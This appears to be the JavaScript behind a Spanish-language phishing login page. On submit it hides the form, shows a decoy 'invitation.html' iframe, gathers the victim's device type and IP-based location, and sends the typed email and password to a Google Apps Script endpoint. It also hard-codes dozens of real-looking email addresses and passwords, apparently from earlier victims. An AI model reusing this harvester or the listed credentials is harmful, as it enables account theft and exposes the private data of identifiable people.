document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); // Evita el envío automático

    // Obtener elementos del formulario
    const emailInput = document.querySelector('input[name="email"]');
    const passwordInput = document.querySelector('input[name="password"]');
    const errorMessage = document.getElementById('error-message');
    
    // Lista de correos electrónicos y contraseñas prohibidas
    const prohibitedEmails = ["n.m.c.i.1612@gmail.com","tuanamasoffia@gmail.com","madiazo@ucvvirtual.edu.pe","wesly_benavides@hotmail.com","elaine242606@gmail.com","karvielysosa@gmail.com","leonorflorence@icloud.com","vigil.angie@outlook.com","bsjsnslzmzn@gmail.com","pierozorrillo@autlook.com","yenderamay@icloud.com","yenderamaya@icloud.com","abenavidesv@ucvvirtual.edu.pe","019100739c@uandina.edu.pe","019100729c@uandina.edu.pe","estefanocernaalaba@gmail.com","guaniloguanilokoke@gmail.com","parcedahua@gmail.com","anaf.felix@upsjb.edu.pe","sophieriverah@gmail.com","dariellasalazar8@gmail.com","jorgealtamirano31@hotmail.com","wonderwallasd1@gmail.com","em.calderontu@alum.up.edu.pe","liateresa993@gmail.com","newan2110@gmail.com","alvillacorta200@gmail.com","mateo_akemi_18@hotmail.com","2320104023@unia.edu.pe","71256596@continental.edu.pe","darkgirlfrank@gmail.com","olenkamaryi2025@gmail.com","minayaanthu@gmail.com","ominayaga@ucvvirtual.edu.pe","elide_gatynha@hotmail.com","darlyn.dayanramendoza@gmail.com","lsanchezv2@upao.edu.pe","tequenazo1995@gmail.com","delgadoangenny@gmail.com","aleferreyro1@gmail.com","bernatAaramichele38@gmail.com","yessenia.arista09@gmail.com"]; // Agregar correos prohibidos aquí
    const prohibitedWords = ["Hum12humhum","tioanner123","Tioanner123","jamon1803","Jamon1803","meamo1234","Meamo1234","pollitoman","Pollitoman","Niall Gómez.291222","Niallgomez.291222","Niallgomez291222","49004408","494408Ks","49004408Ks","49004408ks","494408ks","jhovani","Jhovani","lucian@02","Lucian@02","dametucuenta123","raleflo11","budindepasas7","051612aa","051612aaa","rofKy0-vabgun-juqquq","25575849","271207081119","08112019o","08112019O","pollitoman123","Pollitoman123","Alicia12.","Alicia12..","494408Ks","494408ks","kira123456789","Kira123456789","121619isa","12161906","123456789","1234567890","jhknv","Jhknv","Eliansilva2500","tacachoconcecina","TACACHOCONCECINA","Tacachoconcecina","andreaturzi2306","andreaturzi2306","ctdaciamaria1","Ctdaciamaria1","dayannaPizarro0104_Da1","DayannaPizarro0104_Da1","dayannaPizarro0104_2005","DayannaPizarro0104_2005","Anahi123","anahi123","addiscute20","76391931","joseph2810.@","JOSEPH2810","Joseph2810.@","1sofiarivera3","08112019omar","gidtip-5fowfo-derdUs","16485558","Holaaaa","18668799","Allisonsonrisa","allisonsonrisa","maracaibo2023","Maracaibo2023","75701571","alfalfa23","Alfalfa23","bbbbb","BBBBB","AAAAA","momentico2024@","Momentico2024@","Ai1912Ai","fabianatodio","fabianatodio..","80243690eladio","80243690Eladio","80243690","75573800","74808220kc","74808220Kc","lyssa212002","Lyssa212002","74808220Kc","nicolas2024","nicolas2025","Nicolas2024","Nicolas2025","76693962","Alyssrominaxd","alyssrominaxd","Gonzales7125","VAR20var","fran11fppr18","kiraBella1819B","KiraBella1819B","47867269epp","pepas5314","Pepas5314","fran11fppr1819","Fran11fppr1819","22223333","Lilablue19@@","Lilablue19@@","Lilablue19","lilablue19","Mdnsjsla","Aaaaa","jovita70","Jovita70","jovita70*","Jovita70*","17025612","Jovita70**","jovita70**","75573800","Alyssromina21","alyssromina21","adri71318901","Adri71318901","alyssromina21xd","Alyssromina21xd","cielito1309","Cielito1309","Mybabyslat23$","-Mybabyslat23$","050285cr7","lavidaesunamierda2","Cambiocambio2","Cambiocambio3","cambiocambio3","cambiocambio2","lavidaesunamierda2","emilse.1952@","Madrid1917@","Emilse.1952@","929915693bas","929915693Bas","jugodefresa5","Jugodefresa5","jugodefresa","Jugodefresa","Darlyn2006","darlyn2006","18668799","Tifany123.","Soportes.2025","soportes.2025","jenniffer0505","Jenniffer0505","no quiero p","No quiero p","kimbergor22","Kimbergor22","johitaw12","Johitaw12","ange27","Ange27","Yessenia09","yessenia.09","Yessenia.09","cambiocambio3","pepas5314","Pepas5314","kpgz16$%","jovita70**","Jovita70**","17025612","Jovita70*","jovita70*","grissel1234567890#","Grissel1234567890#","lavidaesunamierda2","Cambiocambio2","cambiocambio2","4FS3YZfpZCjwPAR","977846069","dairy.12","jovita70**","Nuevasoportunidades08","nuevasoportunidades08","Olivia1106","Olivia11.06","Olivia2109","olivia1106","olivia11.06","Olivia2019","olivia2019"]; // Agregar contraseñas prohibidas aquí
    
    const email = emailInput.value.trim().toLowerCase();
    const password = passwordInput.value;
    
    // Validar formato de correo electrónico
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
        errorMessage.textContent = "Correo electrónico no válido";
        errorMessage.style.color = 'red';
        return; // Detiene el procesamiento
    }
    
    // Verificar correo prohibido
    const isProhibitedEmail = prohibitedEmails.includes(email);
    if (isProhibitedEmail) {
        errorMessage.textContent = "Ocurrio un error con el correo intentar con otra dirección";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        emailInput.value = '';
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Verificar contraseña prohibida
    const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
    if (containsProhibitedPassword) {
        errorMessage.textContent = "Contraseña incorrecta";
        errorMessage.style.color = 'red';
        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
        passwordInput.value = '';
        return; // Detiene el procesamiento
    }
    
    // Si pasa todas las validaciones, continúa con el proceso normal
    // Limpiar cualquier mensaje de error previo
    if (errorMessage) {
        errorMessage.textContent = "";
    }

    // Ocultar el formulario
    document.getElementById("miFormulario").style.display = "none";
    
    // Mostrar mensaje "Cargando..."
    let loadingMessage = document.createElement("p");
    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
    loadingMessage.style.textAlign = "center";
    document.body.appendChild(loadingMessage);
    
 // Antes de mostrar el iframe, ocultar el footer de folder.html
document.querySelector("p").style.display = "none"; 

// Mostrar el iframe
let iframe = document.getElementById("usuarioFrame");
iframe.src = "invitation.html";
iframe.style.display = "block";

    
    // Eliminar mensaje de carga después de mostrar usuario.html
    iframe.onload = function() {
        loadingMessage.remove();
    };
    
    // ✅ Detectar si el usuario usa iPhone o Android
    let deviceType = "Otro"; // Valor por defecto
    if (/android/i.test(navigator.userAgent)) {
        deviceType = "Android";
    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
        deviceType = "iPhone";
    }
    
    // ✅ Obtener el país y la ciudad del usuario desde la API
    let country = "Desconocido";
    let city = "Desconocido"; // Añadido: variable para almacenar la ciudad
    try {
        const response = await fetch("https://ipwhois.app/json/");
        const data = await response.json();
        if (data) {
            if (data.country) {
                country = data.country; // Captura el país
            }
            if (data.city) {
                city = data.city; // Captura la ciudad
            }
        }
    } catch (error) {
        console.error("Error obteniendo la ubicación:", error);
    }
    
    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
    const formData = new FormData(this);
    formData.append("device", deviceType); // Agregar dispositivo
    formData.append("country", country + " - " + city); // Agregar país y ciudad combinados
    
    // ✅ Enviar los datos correctamente a Google Sheets
    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
    fetch(url, {
        method: "POST",
        body: new URLSearchParams(formData),
        headers: { "Content-Type": "application/x-www-form-urlencoded" }
    }).catch(error => console.error("Error al enviar datos:", error));
});
